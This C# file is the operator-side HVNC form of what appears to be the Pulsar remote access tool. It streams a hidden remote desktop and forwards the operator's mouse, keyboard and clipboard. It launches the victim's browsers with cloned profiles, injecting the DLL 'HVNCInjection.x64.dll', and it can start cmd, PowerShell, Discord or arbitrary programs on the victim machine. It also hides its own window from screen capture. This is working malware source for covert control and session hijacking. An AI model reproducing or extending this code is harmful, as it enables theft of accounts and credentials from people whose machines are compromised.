using Gma.System.MouseKeyHook;
using Pulsar.Common.Enums;
using Pulsar.Common.Helpers;
using Pulsar.Common.Messages;
using Pulsar.Common.Messages.Monitoring.Clipboard;
using Pulsar.Server.Forms.DarkMode;
using Pulsar.Server.Helper;
using Pulsar.Server.Messages;
using Pulsar.Server.Networking;
using Pulsar.Server.Utilities;
using System;
using System.Collections.Generic;
using System.Drawing;
using System.Threading;
using System.Windows.Forms;
using System.Diagnostics;
using System.IO;
using System.Runtime.InteropServices;
using Pulsar.Common.Messages.Monitoring.HVNC;

namespace Pulsar.Server.Forms
{
    public partial class FrmHVNC : Form
    {
        /// <summary>
        /// States whether remote mouse input is enabled.
        /// </summary>
        private bool _enableMouseInput;

        /// <summary>
        /// States whether remote keyboard input is enabled.
        /// </summary>
        private bool _enableKeyboardInput;

        /// <summary>
        /// Monitors clipboard changes on the server to send to the client
        /// </summary>
        private readonly ClipboardMonitor _clipboardMonitor;

        /// <summary>
        /// States whether bidirectional clipboard sync is enabled
        /// </summary>
        private bool _enableBidirectionalClipboard;

        /// <summary>
        /// The client which can be used for the HVNC.
        /// </summary>
        private readonly Client _connectClient;

        /// <summary>
        /// The message handler for handling the communication with the client.
        /// </summary>
        private readonly HVNCHandler _hVNCHandler;

        /// <summary>
        /// Stopwatch used to suppress FPS display during the initial seconds of the stream,
        /// preventing unstable or misleading values from being shown.
        /// </summary>
        private readonly Stopwatch _fpsDisplayStopwatch = Stopwatch.StartNew();

        /// <summary>
        /// Last frames per second value to show in the title bar.
        /// </summary>
        private float _lastFps = -1f;

        /// <summary>
        /// Holds the opened HVNC form for each client.
        /// </summary>
        private static readonly Dictionary<Client, FrmHVNC> OpenedForms = new Dictionary<Client, FrmHVNC>();

        private bool _useGPU = false;
        private const int UpdateInterval = 10;

        /// <summary>
        /// Creates a new HVNC form for the client or gets the current open form, if there exists one already.
        /// </summary>
        /// <param name="client">The client used for the HVNC form.</param>
        /// <returns>
        /// Returns a new HVNC form for the client if there is none currently open, otherwise creates a new one.
        /// </returns>
        public static FrmHVNC CreateNewOrGetExisting(Client client)
        {
            if (OpenedForms.ContainsKey(client))
            {
                return OpenedForms[client];
            }
            FrmHVNC r = new FrmHVNC(client);
            r.Disposed += (sender, args) => OpenedForms.Remove(client);
            OpenedForms.Add(client, r);
            return r;
        }

        /// <summary>
        /// Initializes a new instance of the <see cref="FrmHVNC"/> class using the given client.
        /// </summary>
        /// <param name="client">The client used for the HVNC form.</param>
        public FrmHVNC(Client client)
        {
            _connectClient = client;
            _hVNCHandler = new HVNCHandler(client);
            _clipboardMonitor = new ClipboardMonitor(client);

            RegisterMessageHandler();
            InitializeComponent();

            DarkModeManager.ApplyDarkMode(this);
            ScreenCaptureHider.ScreenCaptureHider.Apply(this.Handle);
            UpdateInputButtonsVisualState();
        }

        private void UpdateInputButtonsVisualState()
        {
            UpdateButtonState(btnMouse, _enableMouseInput);
            UpdateButtonState(btnKeyboard, _enableKeyboardInput);
            UpdateButtonState(btnBiDirectionalClipboard, _enableBidirectionalClipboard);
        }

        private void UpdateButtonState(Button button, bool enabled)
        {
            if (enabled)
            {
                button.BackColor = Color.FromArgb(0, 120, 0); // Dark green
                button.FlatAppearance.BorderColor = Color.LimeGreen;
            }
            else
            {
                button.BackColor = Color.FromArgb(40, 40, 40); // Default dark
                button.FlatAppearance.BorderColor = Color.Gray;
            }
        }

        /// <summary>
        /// Called whenever a client disconnects.
        /// </summary>
        /// <param name="client">The client which disconnected.</param>
        /// <param name="connected">True if the client connected, false if disconnected</param>
        private void ClientDisconnected(Client client, bool connected)
        {
            if (!connected)
            {
                this.Invoke((MethodInvoker)this.Close);
            }
        }

        /// <summary>
        /// Registers the HVNC message handler for client communication.
        /// </summary>
        private void RegisterMessageHandler()
        {
            _connectClient.ClientState += ClientDisconnected;
            _hVNCHandler.ProgressChanged += UpdateImage;
            MessageHandler.Register(_hVNCHandler);
        }

        /// <summary>
        /// Unregisters the HVNC message handler.
        /// </summary>
        private void UnregisterMessageHandler()
        {
            MessageHandler.Unregister(_hVNCHandler);
            _hVNCHandler.ProgressChanged -= UpdateImage;
            _connectClient.ClientState -= ClientDisconnected;
        }

        /// <summary>
        /// Subscribes to local mouse and keyboard events for HVNC input.
        /// </summary>
        private void SubscribeEvents()
        {
            picDesktop.MouseDown += PicDesktop_MouseDown;
            picDesktop.MouseUp += PicDesktop_MouseUp;
            picDesktop.MouseMove += PicDesktop_MouseMove;
            picDesktop.MouseWheel += PicDesktop_MouseWheel;
            picDesktop.KeyDown += PicDesktop_KeyDown;
            picDesktop.KeyUp += PicDesktop_KeyUp;

            picDesktop.TabStop = true;
            picDesktop.Focus();
        }

        /// <summary>
        /// Unsubscribes from local mouse and keyboard events.
        /// </summary>
        private void UnsubscribeEvents()
        {
            picDesktop.MouseDown -= PicDesktop_MouseDown;
            picDesktop.MouseUp -= PicDesktop_MouseUp;
            picDesktop.MouseMove -= PicDesktop_MouseMove;
            picDesktop.MouseWheel -= PicDesktop_MouseWheel;
            picDesktop.KeyDown -= PicDesktop_KeyDown;
            picDesktop.KeyUp -= PicDesktop_KeyUp;
        }

        /// <summary>
        /// Starts the HVNC stream and begin to receive desktop frames.
        /// </summary>
        private void StartStream(bool useGPU)
        {
            ToggleConfigurationControls(true);

            picDesktop.Start();
            // Subscribe to the new frame counter.
            picDesktop.SetFrameUpdatedEvent(frameCounter_FrameUpdated);

            this.ActiveControl = picDesktop;

            _hVNCHandler.EnableMouseInput = _enableMouseInput;
            _hVNCHandler.EnableKeyboardInput = _enableKeyboardInput;

            _hVNCHandler.MaxFramesPerSecond = 30;

            _hVNCHandler.BeginReceiveFrames(barQuality.Value, cbMonitors.SelectedIndex, useGPU);
        }

        /// <summary>
        /// Stops the HVNC stream.
        /// </summary>
        private void StopStream()
        {
            ToggleConfigurationControls(false);

            picDesktop.Stop();
            // Unsubscribe from the frame counter. It will be re-created when starting again.
            picDesktop.UnsetFrameUpdatedEvent(frameCounter_FrameUpdated);

            this.ActiveControl = picDesktop;

            _hVNCHandler.EndReceiveFrames();
        }

        /// <summary>
        /// Toggles the activatability of configuration controls in the status/configuration panel.
        /// </summary>
        /// <param name="started">When set to <code>true</code> the configuration controls get enabled, otherwise they get disabled.</param>
        private void ToggleConfigurationControls(bool started)
        {
            btnStart.Enabled = !started;
            btnStop.Enabled = started;
            barQuality.Enabled = !started;
            cbMonitors.Enabled = !started;
        }

        /// <summary>
        /// Toggles the visibility of the status/configuration panel.
        /// </summary>
        /// <param name="visible">Decides if the panel should be visible.</param>
        private void TogglePanelVisibility(bool visible)
        {
            panelTop.Visible = visible;
            btnShow.Visible = !visible;

            if (visible)
            {
                // Restore picture below panel
                picDesktop.Top = panelTop.Bottom;
                picDesktop.Height = this.ClientSize.Height - panelTop.Height;
            }
            else
            {
                // Expand picture to fill the whole window
                picDesktop.Top = 0;
                picDesktop.Height = this.ClientSize.Height;
            }

            // Keep full width either way
            picDesktop.Width = this.ClientSize.Width;

            this.ActiveControl = picDesktop;
        }


        /// <summary>
        /// Called whenever the remote displays changed.
        /// </summary>
        /// <param name="sender">The message handler which raised the event.</param>
        /// <param name="displays">The currently available displays.</param>
        private void DisplaysChanged(object sender, int displays)
        {
            cbMonitors.Items.Clear();
            for (int i = 0; i < displays; i++)
                cbMonitors.Items.Add($"Display {i + 1}");
            cbMonitors.SelectedIndex = 0;
        }

        /// <summary>
        /// Updates the current desktop image by drawing it to the desktop picturebox.
        /// </summary>
        /// <param name="sender">The message handler which raised the event.</param>
        /// <param name="bmp">The new desktop image to draw.</param>
        private Stopwatch _stopwatch = new Stopwatch();
        private int _sizeFrames = 0;
        private int _remoteDesktopWidth = 0;
        private int _remoteDesktopHeight = 0;

        private void UpdateImage(object sender, Bitmap bmp)
        {
            if (!_stopwatch.IsRunning)
                _stopwatch.Start();

            _sizeFrames++;

            // Update remote resolution from the frame
            if (bmp != null)
            {
                _remoteDesktopWidth = bmp.Width;
                _remoteDesktopHeight = bmp.Height;
            }

            // ... rest of your existing code
            picDesktop.UpdateImage(bmp, false);
        }

        private void FrmHVNC_Load(object sender, EventArgs e)
        {
            this.Text = WindowHelper.GetWindowTitle("HVNC", _connectClient);

            OnResize(EventArgs.Empty); // trigger resize event to align controls 

            cbMonitors.SelectedIndex = 0;
        }

        /// <summary>
        /// Updates the title with the current frames per second.
        /// </summary>
        /// <param name="e">The new frames per second.</param>
        private void frameCounter_FrameUpdated(FrameUpdatedEventArgs e)
        {
            float fpsToShow;

            if (_fpsDisplayStopwatch.Elapsed.TotalSeconds < 2)
            {
                // Ignore the first 2 seconds to avoid showing fake FPS values
                fpsToShow = 0f;
            }
            else
            {
                float clientFps = _hVNCHandler.CurrentFps;
                fpsToShow = clientFps > 0f ? clientFps : ((_lastFps > 0f) ? _lastFps : e.CurrentFramesPerSecond);
            }

            this.Text = string.Format("{0} - FPS: {1:0.00}", WindowHelper.GetWindowTitle("HVNC", _connectClient), fpsToShow);
        }

        private void FrmHVNC_FormClosing(object sender, FormClosingEventArgs e)
        {
            // all cleanup logic goes here
            UnsubscribeEvents();
            if (_hVNCHandler.IsStarted) StopStream();
            UnregisterMessageHandler();
            _hVNCHandler.Dispose();
            _clipboardMonitor?.Dispose();


            picDesktop.GetImageSafe?.Dispose();
            picDesktop.GetImageSafe = null;
        }

        private void FrmHVNC_Resize(object sender, EventArgs e)
        {
            if (WindowState == FormWindowState.Minimized)
                return;

            panelTop.Width = this.ClientSize.Width;
            picDesktop.Width = this.ClientSize.Width;

            if (panelTop.Visible)
            {
                picDesktop.Top = panelTop.Bottom;
                picDesktop.Height = this.ClientSize.Height - panelTop.Height;
            }
            else
            {
                picDesktop.Top = 0;
                picDesktop.Height = this.ClientSize.Height;
            }

            btnShow.Left = (this.ClientSize.Width - btnShow.Width) / 2;
            btnShow.Top = this.ClientSize.Height - btnShow.Height - 40;
        }



        private void btnStart_Click(object sender, EventArgs e)
        {
            if (cbMonitors.Items.Count == 0)
            {
                MessageBox.Show("No remote display detected.\nPlease wait till the client sends a list with available displays.",
                    "Starting failed", MessageBoxButtons.OK, MessageBoxIcon.Warning);
                return;
            }

            SubscribeEvents();
            StartStream(_useGPU);
        }

        private void btnStop_Click(object sender, EventArgs e)
        {
            UnsubscribeEvents();
            StopStream();
        }

        #region HVNC Configuration

        private void barQuality_Scroll(object sender, EventArgs e)
        {
            int value = barQuality.Value;
            lblQualityShow.Text = value.ToString();

            if (value < 25)
                lblQualityShow.Text += " (low)";
            else if (value >= 85)
                lblQualityShow.Text += " (best)";
            else if (value >= 75)
                lblQualityShow.Text += " (high)";
            else if (value >= 25)
                lblQualityShow.Text += " (mid)";

            this.ActiveControl = picDesktop;
        }

        private void btnMouse_Click(object sender, EventArgs e)
        {
            _enableMouseInput = !_enableMouseInput;

            if (_enableMouseInput)
            {
                this.picDesktop.Cursor = Cursors.Hand;
                btnMouse.Image = Properties.Resources.mouse_add;
                btnMouse.BackColor = Color.LightGreen;
                toolTipButtons.SetToolTip(btnMouse, "Disable mouse input.");
            }
            else
            {
                this.picDesktop.Cursor = Cursors.Default;
                btnMouse.Image = Properties.Resources.mouse_delete;
                btnMouse.BackColor = DefaultBackColor;
                toolTipButtons.SetToolTip(btnMouse, "Enable mouse input.");
            }

            _hVNCHandler.EnableMouseInput = _enableMouseInput;
            UpdateInputButtonsVisualState();
            this.ActiveControl = picDesktop;
        }

        private void btnKeyboard_Click(object sender, EventArgs e)
        {
            _enableKeyboardInput = !_enableKeyboardInput;

            if (_enableKeyboardInput)
            {
                this.picDesktop.Cursor = Cursors.Hand;
                btnKeyboard.Image = Properties.Resources.keyboard_add;
                btnKeyboard.BackColor = Color.LightGreen;
                toolTipButtons.SetToolTip(btnKeyboard, "Disable keyboard input.");
            }
            else
            {
                this.picDesktop.Cursor = Cursors.Default;
                btnKeyboard.Image = Properties.Resources.keyboard_delete;
                btnKeyboard.BackColor = DefaultBackColor;
                toolTipButtons.SetToolTip(btnKeyboard, "Enable keyboard input.");
            }

            _hVNCHandler.EnableKeyboardInput = _enableKeyboardInput;
            UpdateInputButtonsVisualState();
            this.ActiveControl = picDesktop;
        }

        private void btnBiDirectionalClipboard_Click(object sender, EventArgs e)
        {
            _enableBidirectionalClipboard = !_enableBidirectionalClipboard;
            UpdateInputButtonsVisualState();

            _clipboardMonitor.IsEnabled = _enableBidirectionalClipboard;
            Debug.WriteLine(_clipboardMonitor.IsEnabled ? "HVNC: Server->Client clipboard sync enabled." : "HVNC: Server->Client clipboard sync disabled.");


            if (_enableBidirectionalClipboard)
            {
                Thread clipboardThread = new Thread(() =>
                {
                    try
                    {
                        Thread.CurrentThread.SetApartmentState(ApartmentState.STA);

                        if (Clipboard.ContainsText())
                        {
                            string clipboardText = Clipboard.GetText();
                            if (!string.IsNullOrEmpty(clipboardText))
                            {
                                Debug.WriteLine($"HVNC: Sending initial clipboard: {clipboardText.Substring(0, Math.Min(20, clipboardText.Length))}...");
                                _connectClient.Send(new SendClipboardData { ClipboardText = clipboardText });
                            }
                        }
                    }
                    catch (Exception ex)
                    {
                        Debug.WriteLine($"HVNC: Error sending initial clipboard: {ex.Message}");
                    }
                });
                clipboardThread.SetApartmentState(ApartmentState.STA);
                clipboardThread.Start();
            }

            this.ActiveControl = picDesktop;
        }

        #endregion

        #region Helper Methods
        /// <summary>
        /// Loads the HVNCInjection.x64.dll from the current working directory as bytes.
        /// </summary>
        /// <returns>The DLL bytes, or null if the file is not found.</returns>
        private byte[] GetHVNCInjectionDllBytes()
        {
            try
            {
                string dllPath = Path.Combine(AppDomain.CurrentDomain.BaseDirectory, "HVNCInjection.x64.dll");
                if (File.Exists(dllPath))
                {
                    return File.ReadAllBytes(dllPath);
                }
                else
                {
                    Debug.WriteLine($"HVNCInjection.x64.dll not found at: {dllPath}");
                    return null;
                }
            }
            catch (Exception ex)
            {
                Debug.WriteLine($"Error loading HVNCInjection.x64.dll: {ex.Message}");
                return null;
            }
        }
        #endregion

        #region MenuItems
        private void menuItem1_Click(object sender, EventArgs e)
        {
            _connectClient.Send(new StartHVNCProcess
            {
                Path = "Explorer"
            });
        }

        private void menuItem2_Click(object sender, EventArgs e)
        {
            _connectClient.Send(new StartHVNCProcess
            {
                Path = "Chrome",
                DontCloneProfile = !cLONEBROWSERPROFILEToolStripMenuItem.Checked,
                DllBytes = GetHVNCInjectionDllBytes()
            });
        }

        private void startEdgeToolStripMenuItem_Click(object sender, EventArgs e)
        {
            _connectClient.Send(new StartHVNCProcess
            {
                Path = "Edge",
                DontCloneProfile = !cLONEBROWSERPROFILEToolStripMenuItem.Checked,
                DllBytes = GetHVNCInjectionDllBytes()
            });
        }

        private void startBraveToolStripMenuItem_Click(object sender, EventArgs e)
        {
            _connectClient.Send(new StartHVNCProcess
            {
                Path = "Brave",
                DontCloneProfile = !cLONEBROWSERPROFILEToolStripMenuItem.Checked,
                DllBytes = GetHVNCInjectionDllBytes()
            });
        }

        private void startOperaToolStripMenuItem_Click(object sender, EventArgs e)
        {
            _connectClient.Send(new StartHVNCProcess
            {
                Path = "Opera",
                DontCloneProfile = !cLONEBROWSERPROFILEToolStripMenuItem.Checked,
                DllBytes = GetHVNCInjectionDllBytes()
            });
        }

        private void startOperaGXToolStripMenuItem_Click(object sender, EventArgs e)
        {
            _connectClient.Send(new StartHVNCProcess
            {
                Path = "OperaGX",
                DontCloneProfile = !cLONEBROWSERPROFILEToolStripMenuItem.Checked,
                DllBytes = GetHVNCInjectionDllBytes()
            });
        }

        private void startFirefoxToolStripMenuItem_Click(object sender, EventArgs e)
        {
            _connectClient.Send(new StartHVNCProcess
            {
                Path = "Mozilla",
                DontCloneProfile = !cLONEBROWSERPROFILEToolStripMenuItem.Checked
            });
        }

        private void startCmdToolStripMenuItem_Click(object sender, EventArgs e)
        {
            _connectClient.Send(new StartHVNCProcess
            {
                Path = "Cmd"
            });
        }

        private void startPowershellToolStripMenuItem_Click(object sender, EventArgs e)
        {
            _connectClient.Send(new StartHVNCProcess
            {
                Path = "Powershell"
            });
        }

        private void startCustomPathToolStripMenuItem_Click(object sender, EventArgs e)
        {
            FrmCustomFileStarter fileSelectionForm = new FrmCustomFileStarter(_connectClient, typeof(StartHVNCProcess));
            fileSelectionForm.ShowDialog();
        }

        private void startGenericChromiumToolStripMenuItem_Click(object sender, EventArgs e)
        {
            FrmHVNCPopUp genericBrowserForm = new FrmHVNCPopUp(_connectClient, GetHVNCInjectionDllBytes());
            genericBrowserForm.ShowDialog();
        }

        private void cLONEBROWSERPROFILEToolStripMenuItem_Click(object sender, EventArgs e)
        {
            cLONEBROWSERPROFILEToolStripMenuItem.Checked = !cLONEBROWSERPROFILEToolStripMenuItem.Checked;

            if (cLONEBROWSERPROFILEToolStripMenuItem.Checked)
            {
                cLONEBROWSERPROFILEToolStripMenuItem.Text = "CLONE BROWSER PROFILE";
            }
            else
            {
                cLONEBROWSERPROFILEToolStripMenuItem.Text = "DIRECT START BROWSER";
            }
        }

        #endregion

        #region Input Event Handlers

        private int ScaleX(int x) => _remoteDesktopWidth == 0 ? x : x * _remoteDesktopWidth / picDesktop.Width;
        private int ScaleY(int y) => _remoteDesktopHeight == 0 ? y : y * _remoteDesktopHeight / picDesktop.Height;

        private void PicDesktop_MouseDown(object sender, MouseEventArgs e)
        {
            if (!_enableMouseInput) return;

            uint message = e.Button switch
            {
                MouseButtons.Left => 0x0201,
                MouseButtons.Right => 0x0204,
                MouseButtons.Middle => 0x0207,
                _ => 0
            };
            if (message == 0) return;

            int wParam = 0;
            int lParam = (ScaleY(e.Y) << 16) | (ScaleX(e.X) & 0xFFFF);
            _hVNCHandler.SendMouseEvent(message, wParam, lParam);
        }

        private void PicDesktop_MouseUp(object sender, MouseEventArgs e)
        {
            if (!_enableMouseInput) return;

            uint message = e.Button switch
            {
                MouseButtons.Left => 0x0202,
                MouseButtons.Right => 0x0205,
                MouseButtons.Middle => 0x0208,
                _ => 0
            };
            if (message == 0) return;

            int wParam = 0;
            int lParam = (ScaleY(e.Y) << 16) | (ScaleX(e.X) & 0xFFFF);
            _hVNCHandler.SendMouseEvent(message, wParam, lParam);
        }

        private void PicDesktop_MouseMove(object sender, MouseEventArgs e)
        {
            if (!_enableMouseInput) return;

            uint message = 0x0200;
            int wParam = 0;
            int lParam = (ScaleY(e.Y) << 16) | (ScaleX(e.X) & 0xFFFF);
            _hVNCHandler.SendMouseEvent(message, wParam, lParam);
        }

        private void PicDesktop_MouseWheel(object sender, MouseEventArgs e)
        {
            if (!_enableMouseInput) return;

            int x = ScaleX(e.X);
            int y = ScaleY(e.Y);

            if (e.Delta != 0)
            {
                int buttonMask = e.Delta > 0 ? 0x0010 : 0x0020; // Wheel up/down
                _hVNCHandler.SendMouseEvent(0x0201, buttonMask, (y << 16) | (x & 0xFFFF));
                _hVNCHandler.SendMouseEvent(0x0202, 0, (y << 16) | (x & 0xFFFF));
            }
        }

        private void PicDesktop_KeyDown(object sender, KeyEventArgs e)
        {
            if (!_enableKeyboardInput) return;

            uint message = 0x0100; // WM_KEYDOWN
            int wParam = (int)e.KeyCode;
            int lParam = BuildKeyboardLParam(e.KeyCode, false); // false = key down

            _hVNCHandler.SendKeyboardEvent(message, wParam, lParam);
        }

        private void PicDesktop_KeyUp(object sender, KeyEventArgs e)
        {
            if (!_enableKeyboardInput) return;

            uint message = 0x0101; // WM_KEYUP
            int wParam = (int)e.KeyCode;
            int lParam = BuildKeyboardLParam(e.KeyCode, true); // true = key up

            _hVNCHandler.SendKeyboardEvent(message, wParam, lParam);
        }

        #endregion

        private void btnHide_Click(object sender, EventArgs e)
        {
            TogglePanelVisibility(false);
        }

        private void btnShow_Click(object sender, EventArgs e)
        {
            TogglePanelVisibility(true);
        }

        private void startDiscordToolStripMenuItem_Click(object sender, EventArgs e)
        {
            _connectClient.Send(new StartHVNCProcess
            {
                Path = "Discord"
            });
        }

        #region Win32 API and Helper Methods

        [DllImport("user32.dll")]
        private static extern uint MapVirtualKey(uint uCode, uint uMapType);

        /// <summary>
        /// Builds the appropriate lParam value for keyboard messages.
        /// </summary>
        /// <param name="keyCode">The Windows Forms key code</param>
        /// <param name="isKeyUp">True if this is a key up event, false for key down</param>
        /// <returns>The properly formatted lParam for the keyboard message</returns>
        private int BuildKeyboardLParam(Keys keyCode, bool isKeyUp)
        {
            int vk = (int)keyCode;
            uint scanCode = MapVirtualKey((uint)vk, 0); // MAPVK_VK_TO_VSC = 0

            int lParam = 0;

            lParam |= 1;

            lParam |= (int)(scanCode << 16);

            if (IsExtendedKey(vk))
            {
                lParam |= (1 << 24);
            }

            if (isKeyUp)
            {
                lParam |= (1 << 30);
                lParam |= (1 << 31);
            }

            return lParam;
        }

        /// <summary>
        /// Determines if a virtual key code represents an extended key.
        /// </summary>
        /// <param name="virtualKey">The virtual key code</param>
        /// <returns>True if the key is an extended key</returns>
        private bool IsExtendedKey(int virtualKey)
        {
            switch (virtualKey)
            {
                case (int)Keys.Prior:      // Page Up
                case (int)Keys.Next:       // Page Down
                case (int)Keys.End:        // End
                case (int)Keys.Home:       // Home
                case (int)Keys.Left:       // Left arrow
                case (int)Keys.Up:         // Up arrow
                case (int)Keys.Right:      // Right arrow
                case (int)Keys.Down:       // Down arrow
                case (int)Keys.Insert:     // Insert
                case (int)Keys.Delete:     // Delete
                case (int)Keys.LWin:       // Left Windows
                case (int)Keys.RWin:       // Right Windows
                case (int)Keys.Apps:       // Menu
                case (int)Keys.LShiftKey:  // Left Shift (when differentiated)
                case (int)Keys.RShiftKey:  // Right Shift
                case (int)Keys.LControlKey: // Left Control
                case (int)Keys.RControlKey: // Right Control
                case (int)Keys.LMenu:      // Left Alt
                case (int)Keys.RMenu:      // Right Alt
                case (int)Keys.Scroll:     // Scroll Lock
                    return true;
                default:
                    return false;
            }
        }

        #endregion
    }
}